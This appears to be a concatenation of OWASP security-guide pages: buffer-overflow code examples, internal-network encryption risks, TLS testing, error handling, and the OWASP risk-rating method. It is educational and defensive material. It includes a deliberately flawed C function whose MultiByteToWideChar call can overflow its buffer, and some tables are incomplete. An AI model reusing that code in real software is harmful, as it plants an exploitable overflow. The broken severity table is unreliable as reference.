        <div class="highlight">
        <pre class="highlight"><code>if (!(png_ptr-&gt;mode &amp; PNG_HAVE_PLTE)) {
          /* Should be an error, but we can cope with it */
          png_warning(png_ptr, "Missing PLTE before tRNS");
        }
        else if (length &gt; (png_uint_32)png_ptr-&gt;num_palette) {
          png_warning(png_ptr, "Incorrect tRNS chunk length");
          png_crc_finish(png_ptr, length);
          return;
        }
        ...
        png_crc_read(png_ptr, readbuf, (png_size_t)length);
        </code></pre>
        </div>
        </div>
        <h3 id="example-5">Example 5</h3>
        <p>This example also demonstrates the third scenario in which the program&rsquo;s complexity exposes it to buffer overflows. In this case, the exposure is due to the ambiguous interface of one of the functions rather the structure of the code (as was the case in the previous example).</p>
        <p>The <code class="language-plaintext highlighter-rouge">getUserInfo()</code> function takes a username specified as a multibyte string and a pointer to a structure for user information, and populates the structure with information about the user. Since Windows authentication uses Unicode for usernames, the username argument is first converted from a multibyte string to a Unicode string. This function then incorrectly passes the size of <code class="language-plaintext highlighter-rouge">unicodeUser</code> in bytes rather than characters. The call to <code class="language-plaintext highlighter-rouge">MultiByteToWideChar()</code> may therefore write up to <code class="language-plaintext highlighter-rouge">(UNLEN+1)*sizeof(WCHAR)</code> wide characters, or <code class="language-plaintext highlighter-rouge">(UNLEN+1)*sizeof(WCHAR)*sizeof(WCHAR)</code> bytes, to the unicodeUser array, which has only <code class="language-plaintext highlighter-rouge">(UNLEN+1)*sizeof(WCHAR)</code> bytes allocated. If the username string contains more than <code class="language-plaintext highlighter-rouge">UNLEN</code> characters, the call to <code class="language-plaintext highlighter-rouge">MultiByteToWideChar()</code> will overflow the buffer <code class="language-plaintext highlighter-rouge">unicodeUser</code>.</p>
        <div class="language-plaintext highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code>void getUserInfo(char *username, struct _USER_INFO_2 info){
          WCHAR unicodeUser[UNLEN+1];
          MultiByteToWideChar(CP_ACP, 0, username, -1,
                              unicodeUser, sizeof(unicodeUser));
          NetUserGetInfo(NULL, unicodeUser, 2, (LPBYTE *)&amp;info);

      <h4>Encryption plays an important role in cyber defense. This is well-known for external applications and systems but is often overlooked regarding internal networks and infrastructures. Companies and users have to keep in mind that if they don&rsquo;t implement sufficient encryption and cryptographic methods on their systems and protocols used in the internal network, an adjacent threat actor may be able to read, modify or inject data into communications and systems. This lack of encryption can lead to data leakage and the compromising of privileged accounts. It is important to remember that a defense line only to the outside doesn&rsquo;t fully protect the internal systems. As soon as an attacker gains access to the internal network, e.g. via phishing, the outside defense line is mostly obsolete. That is why the security of internal infrastructures has to be as secure as an external system or even more.</h4>
      <h2 id="risk">Risk</h2>
      <p>If insecure cryptographic methods or cryptographic configurations are used, the risk of information leakage and compromising (privileged) accounts is high. This significantly raises the chances of a devastating cyberattack and its impact. For example, if an administrator connects to an internal server with a common remote access protocol like Remote Desktop Protocol - RDP and no encryption or an insecure one is configured, an adjacent and local threat actor can read these credentials from the network and easily compromise a privileged account. The same applies to sensitive information send over the internal network. A company&rsquo;s internal infrastructure typically has many protocols, tools and systems to transfer data or access various components. Each must be configured to use sufficient and secure encryption / cryptographic methods to protect the data and accounts.</p>
      <h2 id="rectification">Rectification</h2>
      <p>It is recommended to ensure all protocols, communications tools, remote access tools, data transfer tools and similar are configured to use secure cryptographic methods and configurations. Additionally, protocols not supporting secure encryption should be migrated to a secure alternative, such as TELNET -&gt; SSH and FTP -&gt; SFTP. Ensure the used cryptographic methods and configurations are sufficient, implement them after best practices and follow official recommendations. Cryptographic functionality should not be developed or implemented by oneself; instead, use publicly available and known libraries, &ldquo;Don&rsquo;t roll your own crypto!&rdquo;.</p>
      <h2 id="example-attack-scenarios">Example Attack Scenarios</h2>
      <p><strong>Scenario #1: Unencrypted Remote Access Tools</strong> A company has a common internal it-infrastructure with different internal servers to provide applications to the employees. One of these applications is a Customer Relationship Management - CRM system which holds important and sensitive data about the customers of the company. A threat actor gains access to the internal infrastructure over an unknown internet-exposed system for the company, which resulted from a misconfiguration. The threat actor sniffs the internal network, listening to all internal network traffic from the machine they first compromised. An administrator connects to an internal file server to perform an update and uses telnet to connect to the server. Because telnet has no data encryption, the administrator&rsquo;s credentials are sent in clear text over the internal network. The threat actor is able to capture this network packet and, therefore, compromises the administrator&rsquo;s account. They use these credentials to log on to the CRM server and exfiltrate all the customer data they later sell to a concurrent company.</p>
      <p><strong>Scenario #2: Insufficient Use of Cryptography</strong> A company has an internal IT infrastructure with several internal applications. One of these applications is used to create invoices for company customers. A threat actor gains access to the internal network and can inspect and inject packets into the internal network traffic. An employee connects to the invoice system to create multiple invoices. The communication protocol between the employee&rsquo;s laptop and the invoice server is encrypted but doesn&rsquo;t perform a cryptographic identity or integrity check. The threat actor uses this vulnerability to perform a Man in the Middle - MitM attack and injects and modifies data packets. The threat actor modifies the data the employee sends to the invoice server to redirect the money not to the company&rsquo;s account but to an account controlled by the threat actor. When the customer pays the invoice sent to them, they transfer the money to the attacker instead of the company.</p>

        <h4>When information is sent between the client and the server, it must be encrypted and protected in order to prevent an attacker from being able to read or modify it. This is most commonly done using HTTPS, which uses the <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">Transport Layer Security (TLS)</a> protocol, a replacement for the older Secure Socket Layer (SSL) protocol. TLS also provides a way for the server to demonstrate to the client that they have connected to the correct server, by presenting a trusted digital certificate.</h4>
        <p>Over the years there have been a large number of cryptographic weaknesses identified in the SSL and TLS protocols, as well as in the ciphers that they use. Additionally, many of the implementations of these protocols have also had serious vulnerabilities. As such, it is important to test that sites are not only implementing TLS, but that they are doing so in a secure manner.</p>
        <h2 id="test-objectives">Test Objectives</h2>
        <ul>
        <li>Validate the service configuration.</li>
        <li>Review the digital certificate&rsquo;s cryptographic strength and validity.</li>
        <li>Ensure that the TLS security is not bypassable and is properly implemented across the application.</li>
        </ul>
        <h2 id="how-to-test">How to Test</h2>
        <p>Transport layer security related issues can be broadly split into the following areas:</p>
        <h3 id="server-configuration">Server Configuration</h3>
        <p>There are a large number of protocol versions, ciphers, and extensions supported by TLS. Many of these are considered to be legacy, and have cryptographic weaknesses, such as those listed below. Note that new weaknesses are likely to be identified over time, so this list may be incomplete.</p>

        <h4 id="exploitability">Exploitability</h4>
        <p>It should be emphasised that while many of these attacks have been demonstrated in a lab environment, they are not generally considered practical to exploit in the real world, as they require a (usually active) MitM attack, and significant resources. As such, they are unlikely to be exploited by anyone other than nation states.</p>
        <h3 id="digital-certificates">Digital Certificates</h3>
        <h4 id="cryptographic-weaknesses">Cryptographic Weaknesses</h4>
        <p>From a cryptographic perspective, there are two main areas that need to be reviewed on a digital certificate:</p>
        <ul>
        <li>The key strength should be <em>at least</em> 2048 bits.</li>
        <li>The signature algorithm should be <em>at least</em> SHA-256. Legacy algorithms such as MD5 and SHA-1 should not be used.</li>
        </ul>
        <h4 id="validity">Validity</h4>
        <p>As well as being cryptographically secure, the certificate must also be considered valid (or trusted). This means that it must:</p>
        <ul>
        <li>Be within the defined validity period.
        <ul>
        <li>Any certificates issued after 1st September 2020 must not have a maximum lifespan of more than <a href="https://blog.mozilla.org/security/2020/07/09/reducing-tls-certificate-lifespans-to-398-days/">398 days</a>.</li>
        </ul>
        </li>
        <li>Be signed by a trusted certificate authority (CA).
        <ul>
        <li>This should either be a trusted public CA for externally facing applications, or an internal CA for internal applications.</li>
        <li>Don&rsquo;t flag internal applications as having untrusted certificates just because <em>your</em> system doesn&rsquo;t trust the CA.</li>
        </ul>
        </li>
        <li>Have a Subject Alternate Name (SAN) that matches the hostname of the system.
        <ul>
        <li>The Common Name (CN) field is ignored by modern browsers, which only look at the SAN.</li>
        <li>Make sure that you&rsquo;re accessing the system with the correct name (for example, if you access the host by IP then any certificate will be appear untrusted).</li>
        </ul>
        </li>
        </ul>
        <p>Some certificates may be issued for wildcard domains (such as <code class="language-plaintext highlighter-rouge">*.example.org</code>), meaning that they can be valid for multiple subdomains. Although convenient, there are a number of security concerns around this that should be considered. These are discussed in the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#carefully-consider-the-use-of-wildcard-certificates">OWASP Transport Layer Security Cheat Sheet</a>.</p>
        <p>Certificates can also leak information about internal systems or domain names in the Issuer and SAN fields, which can be useful when trying to build up a picture of the internal network or conduct social engineering activities.</p>
        <h3 id="implementation-vulnerabilities">Implementation Vulnerabilities</h3>
        <p>Over the years there have been vulnerabilities in the various TLS implementations. There are too many to list here, but some of the key examples are:</p>
        <ul>
        <li><a href="https://www.debian.org/security/2008/dsa-1571">Debian OpenSSL Predictable Random Number Generator</a> (CVE-2008-0166)</li>
        <li><a href="https://www.openssl.org/news/secadv/20091111.txt">OpenSSL Insecure Renegotiation</a> (CVE-2009-3555)</li>
        <li><a href="https://heartbleed.com">OpenSSL Heartbleed</a> (CVE-2014-0160)</li>
        <li><a href="https://support.f5.com/csp/article/K15882">F5 TLS POODLE</a> (CVE-2014-8730)</li>
        <li><a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-066">Microsoft Schannel Denial of Service</a> (MS14-066 / CVE-2014-6321)</li>
        </ul>
        <h3 id="application-vulnerabilities">Application Vulnerabilities</h3>
        <p>As well as the underlying TLS configuration being securely configured, the application also needs to use it in a secure way. Some of these points are addressed elsewhere in this guide:</p>
        <ul>
        <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels">Not sending sensitive data over unencrypted channels (WSTG-CRYP-03)</a></li>

        </ul>
        <h4 id="mixed-active-content">Mixed Active Content</h4>
        <p>Mixed active content is when active resources (such as scripts to CSS) are loaded over unencrypted HTTP and included into a secure (HTTPS) page. This is dangerous because it would allow an attacker to modify these files (as they are sent unencrypted), which could allow them to execute arbitrary code (JavaScript or CSS) in the page. Passive content (such as images) loaded over an insecure connection can also leak information or allow an attacker to deface the page, although it is less likely to lead to a full compromise.</p>
        <blockquote>
        <p>Note: modern browsers will block active content being loaded from insecure sources into secure pages.</p>
        </blockquote>
        <h4 id="redirecting-from-http-to-https">Redirecting from HTTP to HTTPS</h4>
        <p>Many sites will accept connections over unencrypted HTTP, and then immediately redirect the user to the secure (HTTPS) version of the site with a <code class="language-plaintext highlighter-rouge">301 Moved Permanently</code> redirect. The HTTPS version of the site then sets the <code class="language-plaintext highlighter-rouge">Strict-Transport-Security</code> header to instruct the browser to always use HTTPS in future.</p>
        <p>However, if an attacker is able to intercept this initial request, they could redirect the user to a malicious site, or use a tool such as <a href="https://github.com/moxie0/sslstrip">sslstrip</a> to intercept subsequent requests.</p>
        <p>In order to defend against this type of attack, the site must use be added to the <a href="https://hstspreload.org">preload list</a>.</p>
        <h2 id="automated-testing">Automated Testing</h2>
        <p>There are a large number of scanning tools that can be used to identify weaknesses in the SSL/TLS configuration of a service, including both dedicated tools and general purpose vulnerability scanners. Some of the more popular ones are:</p>
        <ul>
        <li><a href="https://nmap.org">Nmap</a> (various scripts)</li>
        <li><a href="https://owasp.org/www-project-o-saft/">OWASP O-Saft</a></li>
        <li><a href="https://github.com/rbsec/sslscan">sslscan</a></li>
        <li><a href="https://github.com/nabla-c0d3/sslyze">sslyze</a></li>
        <li><a href="https://www.ssllabs.com/ssltest/">SSL Labs</a></li>
        <li><a href="https://github.com/drwetter/testssl.sh">testssl.sh</a></li>
        </ul>
        <h3 id="manual-testing">Manual Testing</h3>
        <p>It is also possible to carry out most checks manually, using command-line looks such as <code class="language-plaintext highlighter-rouge">openssl s_client</code> or <code class="language-plaintext highlighter-rouge">gnutls-cli</code> to connect with specific protocols, ciphers or options.</p>
        <p>When testing like this, be aware that the version of OpenSSL or GnuTLS shipped with most modern systems may will not support some outdated and insecure protocols such as SSLv2 or EXPORT ciphers. Make sure that your version supports the outdated versions before using it for testing, or you&rsquo;ll end up with false negatives.</p>
        <p>It can also be possible to performed limited testing using a web browser, as modern browsers will provide details of the protocols and ciphers that are being used in their developer tools. They also provide an easy way to test whether a certificate is considered trusted, by browsing to the service and seeing if you are presented with a certificate warning.</p>

    <div id="main" class="page-body tab" tabindex="0">
    <section id="sec-main" class="page-body">
    <h4>Improper handling of errors can introduce a variety of security problems for a web site. The most common problem is when detailed internal error messages such as stack traces, database dumps, and error codes are displayed to the user (hacker). These messages reveal implementation details that should never be revealed. Such details can provide hackers important clues on potential flaws in the site and such messages are also disturbing to normal users.</h4>
    <p>Web applications frequently generate error conditions during normal operation. Out of memory, null pointer exceptions, system call failure, database unavailable, network timeout, and hundreds of other common conditions can cause errors to be generated. These errors must be handled according to a well thought out scheme that will provide a meaningful error message to the user, diagnostic information to the site maintainers, and no useful information to an attacker.</p>
    <p>Even when error messages don&rsquo;t provide a lot of detail, inconsistencies in such messages can still reveal important clues on how a site works, and what information is present under the covers. For example, when a user tries to access a file that does not exist, the error message typically indicates, &ldquo;file not found&rdquo;. When accessing a file that the user is not authorized for, it indicates, &ldquo;access denied&rdquo;. The user is not supposed to know the file even exists, but such inconsistencies will readily reveal the presence or absence of inaccessible files or the site&rsquo;s directory structure.</p>
    <p>One common security problem caused by improper error handling is the fail-open security check. All security mechanisms should deny access until specifically granted, not grant access until denied, which is a common reason why fail open errors occur. Other errors can cause the system to crash or consume significant resources, effectively denying or reducing service to legitimate users.</p>
    <p>Good error handling mechanisms should be able to handle any feasible set of inputs, while enforcing proper security. Simple error messages should be produced and logged so that their cause, whether an error in the site or a hacking attempt, can be reviewed. Error handling should not focus solely on input provided by the user, but should also include any errors that can be generated by internal components such as system calls, database queries, or any other internal functions.</p>
    <h2 id="environments-affected">Environments Affected</h2>
    <p>All web servers, application servers, and web application environments are susceptible to error handling problems.</p>
    <h2 id="examples-and-references">Examples and References</h2>
    <ul>
    <li><a href="https://owasp.org/www-project-web-security-testing-guide/">OWASP Testing Guide</a></li>
    </ul>
    <h2 id="how-to-determine-if-you-are-vulnerable">How to Determine If You Are Vulnerable</h2>
    <p>Typically, simple testing can determine how your site responds to various kinds of input errors. More thorough testing is usually required to cause internal errors to occur and see how the site behaves.</p>
    <p>Another valuable approach is to have a detailed code review that searches the code for error handling logic. Error handling should be consistent across the entire site and each piece should be a part of a well-designed scheme. A code review will reveal how the system is intended to handle various types of errors. If you find that there is no organization to the error-handling scheme or that there appear to be several different schemes, there is quite likely a problem.</p>
    <h2 id="how-to-protect-yourself">How to Protect Yourself</h2>
    <p>A specific policy for how to handle errors should be documented, including the types of errors to be handled and for each, what information is going to be reported back to the user, and what information is going to be logged. All developers need to understand the policy and ensure that their code follows it.</p>
    <p>In the implementation, ensure that the site is built to gracefully handle all possible errors. When errors occur, the site should respond with a specifically designed result that is helpful to the user without revealing unnecessary internal details. Certain classes of errors should be logged to help detect implementation flaws in the site and/or hacking attempts. Very few sites have any intrusion detection capabilities in their web application, but it is certainly conceivable that a web application could track repeated failed attempts and generate alerts. Note that the vast majority of web application attacks are never detected because so few sites have the capability to detect them. Therefore, the prevalence of web application security attacks is likely to be seriously underestimated</p>

        <h1 id="introduction">Introduction</h1>
        <p>Discovering vulnerabilities is important, but being able to estimate the associated risk to the business is just as important. Early in the life cycle, one may identify security concerns in the architecture or design by using <a href="https://owasp.org/www-community/Threat_Modeling">threat modeling</a>. Later, one may find security issues using <a href="https://wiki.owasp.org/index.php/Category:OWASP_Code_Review_Project">code review</a> or <a href="https://owasp.org/www-project-web-security-testing-guide/">penetration testing</a>. Or problems may not be discovered until the application is in production and is actually compromised.</p>
        <p>By following the approach here, it is possible to estimate the severity of all of these risks to the business and make an informed decision about what to do about those risks. Having a system in place for rating risks will save time and eliminate arguing about priorities. This system will help to ensure that the business doesn&rsquo;t get distracted by minor risks while ignoring more serious risks that are less well understood.</p>
        <p>Ideally, there would be a universal risk rating system that would accurately estimate all risks for all organizations. But a vulnerability that is critical to one organization may not be very important to another. So a basic framework is presented here that should be &lsquo;&lsquo;customized&rsquo;&rsquo; for the particular organization.</p>
        <p>The authors have tried hard to make this model simple to use, while keeping enough detail for accurate risk estimates to be made. Please reference the section below on customization for more information about tailoring the model for use in a specific organization.</p>
        <h2 id="approach">Approach</h2>
        <p>There are many different approaches to risk analysis. See the reference section below for some of the most common ones. The OWASP approach presented here is based on these standard methodologies and is customized for application security.</p>
        <p>Let&rsquo;s start with the standard risk model:</p>
        <ul>
        <li><strong>Risk = Likelihood * Impact</strong></li>
        </ul>
        <p>In the sections below, the factors that make up &ldquo;likelihood&rdquo; and &ldquo;impact&rdquo; for application security are broken down. The tester is shown how to combine them to determine the overall severity for the risk.</p>
        <div class="language-plaintext highlighter-rouge">

        <pre class="highlight"><code>  Step 1: Identifying a Risk

          Step 5: Deciding What to Fix
          Step 6: Customizing Your Risk Rating Model
        </code></pre>
        </div>
        </div>
        <h3 id="step-1-identifying-a-risk">Step 1: Identifying a Risk</h3>
        <p>The first step is to identify a security risk that needs to be rated. The tester needs to gather information about the threat agent involved, the attack that will be used, the vulnerability involved, and the impact of a successful exploit on the business. There may be multiple possible groups of attackers, or even multiple possible business impacts. In general, it&rsquo;s best to err on the side of caution by using the worst-case option, as that will result in the highest overall risk.</p>
        <h3 id="step-2-factors-for-estimating-likelihood">Step 2: Factors for Estimating Likelihood</h3>
        <p>Once the tester has identified a potential risk and wants to figure out how serious it is, the first step is to estimate the &ldquo;likelihood&rdquo;. At the highest level, this is a rough measure of how likely this particular vulnerability is to be uncovered and exploited by an attacker. It is not necessary to be over-precise in this estimate. Generally, identifying whether the likelihood is low, medium, or high is sufficient.</p>
        <p>There are a number of factors that can help determine the likelihood. The first set of factors are related to the threat agent involved. The goal is to estimate the likelihood of a successful attack from a group of possible attackers. Note that there may be multiple threat agents that can exploit a particular vulnerability, so it&rsquo;s usually best to use the worst-case scenario. For example, an insider may be a much more likely attacker than an anonymous outsider, but it depends on a number of factors.</p>
        <p>Note that each factor has a set of options, and each option has a likelihood rating from 0 to 9 associated with it. These numbers will be used later to estimate the overall likelihood.</p>
        <h4 id="threat-agent-factors">Threat Agent Factors</h4>
        <p>The first set of factors are related to the threat agent involved. The goal here is to estimate the likelihood of a successful attack by this group of threat agents. Use the worst-case threat agent.</p>
        <ul>
        <li>
        <p><strong>Skill Level</strong> - How technically skilled is this group of threat agents? No technical skills (1), some technical skills (3), advanced computer user (5), network and programming skills (6), security penetration skills (9)</p>
        </li>
        <li>
        <p><strong>Motive</strong> - How motivated is this group of threat agents to find and exploit this vulnerability? Low or no reward (1), possible reward (4), high reward (9)</p>
        </li>
        <li>
        <p><strong>Opportunity</strong> - What resources and opportunities are required for this group of threat agents to find and exploit this vulnerability? Full access or expensive resources required (0), special access or resources required (4), some access or resources required (7), no access or resources required (9)</p>
        </li>
        <li>
        <p><strong>Size</strong> - How large is this group of threat agents? Developers (2), system administrators (2), intranet users (4), partners (5), authenticated users (6), anonymous Internet users (9)</p>
        </li>
        </ul>
        <h4 id="vulnerability-factors">Vulnerability Factors</h4>
        <p>The next set of factors are related to the vulnerability involved. The goal here is to estimate the likelihood of the particular vulnerability involved being discovered and exploited. Assume the threat agent selected above.</p>
        <ul>
        <li>
        <p><strong>Ease of Discovery</strong> - How easy is it for this group of threat agents to discover this vulnerability? Practically impossible (1), difficult (3), easy (7), automated tools available (9)</p>
        </li>
        <li>
        <p><strong>Ease of Exploit</strong> - How easy is it for this group of threat agents to actually exploit this vulnerability? Theoretical (1), difficult (3), easy (5), automated tools available (9)</p>
        </li>
        <li>
        <p><strong>Awareness</strong> - How well known is this vulnerability to this group of threat agents? Unknown (1), hidden (4), obvious (6), public knowledge (9)</p>
        </li>
        <li>
        <p><strong>Intrusion Detection</strong> - How likely is an exploit to be detected? Active detection in application (1), logged and reviewed (3), logged without review (8), not logged (9)</p>
        </li>
        </ul>
        <h3 id="step-3-factors-for-estimating-impact">Step 3: Factors for Estimating Impact</h3>
        <p>When considering the impact of a successful attack, it&rsquo;s important to realize that there are two kinds of impacts. The first is the &ldquo;technical impact&rdquo; on the application, the data it uses, and the functions it provides. The other is the &ldquo;business impact&rdquo; on the business and company operating the application.</p>
        <p>Ultimately, the business impact is more important. However, you may not have access to all the information required to figure out the business consequences of a successful exploit. In this case, providing as much detail about the technical risk will enable the appropriate business representative to make a decision about the business risk.</p>
        <p>Again, each factor has a set of options, and each option has an impact rating from 0 to 9 associated with it. We&rsquo;ll use these numbers later to estimate the overall impact.</p>
        <h4 id="technical-impact-factors">Technical Impact Factors</h4>
        <p>Technical impact can be broken down into factors aligned with the traditional security areas of concern: confidentiality, integrity, availability, and accountability. The goal is to estimate the magnitude of the impact on the system if the vulnerability were to be exploited.</p>
        <ul>
        <li>
        <p><strong>Loss of Confidentiality</strong> - How much data could be disclosed and how sensitive is it? Minimal non-sensitive data disclosed (2), minimal critical data disclosed (6), extensive non-sensitive data disclosed (6), extensive critical data disclosed (7), all data disclosed (9)</p>
        </li>
        <li>
        <p><strong>Loss of Integrity</strong> - How much data could be corrupted and how damaged is it? Minimal slightly corrupt data (1), minimal seriously corrupt data (3), extensive slightly corrupt data (5), extensive seriously corrupt data (7), all data totally corrupt (9)</p>
        </li>
        <li>
        <p><strong>Loss of Availability</strong> - How much service could be lost and how vital is it? Minimal secondary services interrupted (1), minimal primary services interrupted (5), extensive secondary services interrupted (5), extensive primary services interrupted (7), all services completely lost (9)</p>
        </li>
        <li>
        <p><strong>Loss of Accountability</strong> - Are the threat agents&rsquo; actions traceable to an individual? Fully traceable (1), possibly traceable (7), completely anonymous (9)</p>
        </li>
        </ul>
        <h4 id="business-impact-factors">Business Impact Factors</h4>
        <p>The business impact stems from the technical impact, but requires a deep understanding of what is important to the company running the application. In general, you should be aiming to support your risks with business impact, particularly if your audience is executive level. The business risk is what justifies investment in fixing security problems.</p>
        <p>Many companies have an asset classification guide and/or a business impact reference to help formalize what is important to their business. These standards can help you focus on what&rsquo;s truly important for security. If these aren&rsquo;t available, then it is necessary to talk with people who understand the business to get their take on what&rsquo;s important.</p>
        <p>The factors below are common areas for many businesses, but this area is even more unique to a company than the factors related to threat agent, vulnerability, and technical impact.</p>
        <ul>
        <li>
        <p><strong>Financial damage</strong> - How much financial damage will result from an exploit? Less than the cost to fix the vulnerability (1), minor effect on annual profit (3), significant effect on annual profit (7), bankruptcy (9)</p>
        </li>
        <li>
        <p><strong>Reputation damage</strong> - Would an exploit result in reputation damage that would harm the business? Minimal damage (1), Loss of major accounts (4), loss of goodwill (5), brand damage (9)</p>
        </li>
        <li>
        <p><strong>Non-compliance</strong> - How much exposure does non-compliance introduce? Minor violation (2), clear violation (5), high profile violation (7)</p>
        </li>
        <li>
        <p><strong>Privacy violation</strong> - How much personally identifiable information could be disclosed? One individual (3), hundreds of people (5), thousands of people (7), millions of people (9)</p>
        </li>
        </ul>
        <h3 id="step-4-determining-the-severity-of-the-risk">Step 4: Determining the Severity of the Risk</h3>
        <p>In this step, the likelihood estimate and the impact estimate are put together to calculate an overall severity for this risk. This is done by figuring out whether the likelihood is low, medium, or high and then do the same for impact. The 0 to 9 scale is split into three parts:</p>
        <table border="1" width="40%" cellspacing="0" cellpadding="5" align="center">
        <tbody>
        <tr>
        <th colspan="2" align="center">Likelihood and Impact Levels</th>
        </tr>
        <tr>
        <td align="center" width="50%">0 to &lt;3</td>
        <td align="center" bgcolor="lightgreen" width="50%">LOW</td>
        </tr>
        <tr>
        <td align="center">3 to &lt;6</td>
        <td align="center" bgcolor="yellow">MEDIUM</td>
        </tr>
        <tr>
        <td align="center">6 to 9</td>
        <td align="center" bgcolor="red">HIGH</td>
        </tr>
        </tbody>
        </table>
        <h4 id="informal-method">Informal Method</h4>
        <p>In many environments, there is nothing wrong with reviewing the factors and simply capturing the answers. The tester should think through the factors and identify the key &ldquo;driving&rdquo; factors that are controlling the result. The tester may discover that their initial impression was wrong by considering aspects of the risk that weren&rsquo;t obvious.</p>
        <h4 id="repeatable-method">Repeatable Method</h4>
        <p>If it is necessary to defend the ratings or make them repeatable, then it is necessary to go through a more formal process of rating the factors and calculating the result. Remember that there is quite a lot of uncertainty in these estimates and that these factors are intended to help the tester arrive at a sensible result. This process can be supported by automated tools to make the calculation easier.</p>
        <p>The first step is to select one of the options associated with each factor and enter the associated number in the table. Then simply take the average of the scores to calculate the overall likelihood. For example:</p>
        <table border="1" cellspacing="0" cellpadding="5" align="center">
        <tbody>
        <tr>
        <td colspan="4" align="center">'''Threat agent factors'''</td>
        <td>&nbsp;</td>
        <td colspan="4" align="center">'''Vulnerability factors'''</td>
        </tr>
        <tr>
        <td align="center" width="10%">Skill level</td>
        <td align="center" width="10%">Motive</td>
        <td align="center" width="10%">Opportunity</td>
        <td align="center" width="10%">Size</td>
        <td align="center" width="2%">&nbsp;</td>
        <td align="center" width="10%">Ease of discovery</td>
        <td align="center" width="10%">Ease of exploit</td>
        <td align="center" width="10%">Awareness</td>
        <td align="center" width="10%">Intrusion detection</td>
        </tr>
        <tr>
        <td align="center">5</td>
        <td align="center">2</td>
        <td align="center">7</td>
        <td align="center">1</td>
        <td align="center">&nbsp;</td>
        <td align="center">3</td>
        <td align="center">6</td>
        <td align="center">9</td>
        <td align="center">2</td>
        </tr>
        <tr>
        <td colspan="9" align="center" bgcolor="lightblue">Overall likelihood=4.375 (MEDIUM)</td>
        </tr>
        </tbody>
        </table>
        <p><br /> Next, the tester needs to figure out the overall impact. The process is similar here. In many cases the answer will be obvious, but the tester can make an estimate based on the factors, or they can average the scores for each of the factors. Again, less than 3 is low, 3 to less than 6 is medium, and 6 to 9 is high. For example:</p>
        <table border="1" cellspacing="0" cellpadding="5" align="center">
        <tbody>
        <tr>
        <th colspan="4" align="center">Technical Impact</th>
        <td>&nbsp;</td>
        <th colspan="4" align="center">Business Impact</th>
        </tr>
        <tr>
        <td align="center" width="10%">Loss of confidentiality</td>
        <td align="center" width="10%">Loss of integrity</td>
        <td align="center" width="10%">Loss of availability</td>
        <td align="center" width="10%">Loss of accountability</td>
        <td align="center" width="2%">&nbsp;</td>
        <td align="center" width="10%">Financial damage</td>
        <td align="center" width="10%">Reputation damage</td>
        <td align="center" width="10%">Non-compliance</td>
        <td align="center" width="10%">Privacy violation</td>
        </tr>
        <tr>
        <td align="center">9</td>
        <td align="center">7</td>
        <td align="center">5</td>
        <td align="center">8</td>
        <td align="center">&nbsp;</td>
        <td align="center">1</td>
        <td align="center">2</td>
        <td align="center">1</td>
        <td align="center">5</td>
        </tr>
        <tr>
        <td colspan="4" align="center" bgcolor="lightblue">Overall technical impact=7.25 (HIGH)</td>
        <td>&nbsp;</td>
        <td colspan="4" align="center" bgcolor="lightblue">Overall business impact=2.25 (LOW)</td>
        </tr>
        </tbody>
        </table>
        <p>&nbsp;</p>
        <h4 id="determining-severity">Determining Severity</h4>
        <p>However the tester arrives at the likelihood and impact estimates, they can now combine them to get a final severity rating for this risk. Note that if they have good business impact information, they should use that instead of the technical impact information. But if they have no information about the business, then technical impact is the next best thing.</p>
        <table border="1" cellspacing="0" cellpadding="5" align="center">
        <tbody>
        <tr>
        <th colspan="5" align="center">Overall Risk Severity</th>
        </tr>
        <tr>
        <th rowspan="4" align="center" width="15%">Impact</th>
        <td align="center" width="15%">HIGH</td>

        </tr>
        <tr>

        <td align="center" bgcolor="yellow">Low</td>
        <td align="center" bgcolor="orange">Medium</td>

        <tr>

        <td align="center" bgcolor="yellow">Low</td>
        <td align="center" bgcolor="orange">Medium</td>
        </tr>
        <tr>
        <td align="center">&nbsp;</td>
        <td align="center">LOW</td>
        <td align="center">MEDIUM</td>
        <td align="center">HIGH</td>

        <tr>
        <td align="center">&nbsp;</td>
        <th colspan="4" align="center">Likelihood</th>
        </tr>
        </tbody>
        </table>
        <p><br /> In the example above, the likelihood is medium and the technical impact is high, so from a purely technical perspective it appears that the overall severity is high. However, note that the business impact is actually low, so the overall severity is best described as low as well. This is why understanding the business context of the vulnerabilities you are evaluating is so critical to making good risk decisions. Failure to understand this context can lead to the lack of trust between the business and security teams that is present in many organizations.</p>
        <h3 id="step-5-deciding-what-to-fix">Step 5: Deciding What to Fix</h3>
        <p>After the risks to the application have been classified, there will be a prioritized list of what to fix. As a general rule, the most severe risks should be fixed first. It simply doesn&rsquo;t help the overall risk profile to fix less important risks, even if they&rsquo;re easy or cheap to fix.</p>
        <p>Remember that not all risks are worth fixing, and some loss is not only expected, but justifiable based upon the cost of fixing the issue. For example, if it would cost $100,000 to implement controls to stem $2,000 of fraud per year, it would take 50 years return on investment to stamp out the loss. But remember there may be reputation damage from the fraud that could cost the organization much more.</p>
        <h3 id="step-6-customizing-the-risk-rating-model">Step 6: Customizing the Risk Rating Model</h3>
        <p>Having a risk ranking framework that is customizable for a business is critical for adoption. A tailored model is much more likely to produce results that match people&rsquo;s perceptions about what is a serious risk. A lot of time can be wasted arguing about the risk ratings if they are not supported by a model like this. There are several ways to tailor this model for the organization.</p>
        <h4 id="adding-factors">Adding factors</h4>
        <p>The tester can choose different factors that better represent what&rsquo;s important for the specific organization. For example, a military application might add impact factors related to loss of human life or classified information. The tester might also add likelihood factors, such as the window of opportunity for an attacker or encryption algorithm strength.</p>
        <h4 id="customizing-options">Customizing options</h4>
        <p>There are some sample options associated with each factor, but the model will be much more effective if the tester customizes these options to the business. For example, use the names of the different teams and the company names for different classifications of information. The tester can also change the scores associated with the options. The best way to identify the right scores is to compare the ratings produced by the model with ratings produced by a team of experts. You can tune the model by carefully adjusting the scores to match.</p>
        <h4 id="weighting-factors">Weighting factors</h4>
        <p>The model above assumes that all the factors are equally important. You can weight the factors to emphasize the factors that are more significant for the specific business. This makes the model a bit more complex, as the tester needs to use a weighted average. But otherwise everything works the same. Again it is possible to tune the model by matching it against risk ratings the business agrees are accurate.</p>

  <div class="tab-pane fade" id="issue-auth" role="tabpanel" aria-labelledby="issue-auth-tab">
